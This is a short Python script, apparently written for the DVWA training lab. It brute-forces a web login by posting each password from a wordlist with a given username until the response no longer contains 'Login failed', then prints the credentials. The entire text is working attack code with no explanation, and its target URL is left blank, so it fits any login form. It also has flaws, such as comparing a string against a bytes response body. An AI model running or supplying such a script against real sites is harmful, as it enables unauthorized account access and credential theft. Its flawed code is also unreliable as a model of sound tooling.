#!/usr/bin/python

from urllib import response
import requests

def siteForce(username, url):
    for password in passwords:
        password = password.strip()
        print("Attempting with password: " + password)
        # Retrieve form info from site source
        data_dictionary = {"username":username,"password":password,"Login":"submit"}
        response = requests.post(url, data=data_dictionary)
        if "Login failed" in response.content:
            pass
        else:
            print("Username: " + username)
            print("Password: " + password)
            exit()
        
# DVWA site
url = ""
username = input("Enter username: ")
passwd_file = input("Enter path to password list: ")

with open(passwd_file, 'r') as passwords:
    siteForce(username, url)

print("Password not in this list.")
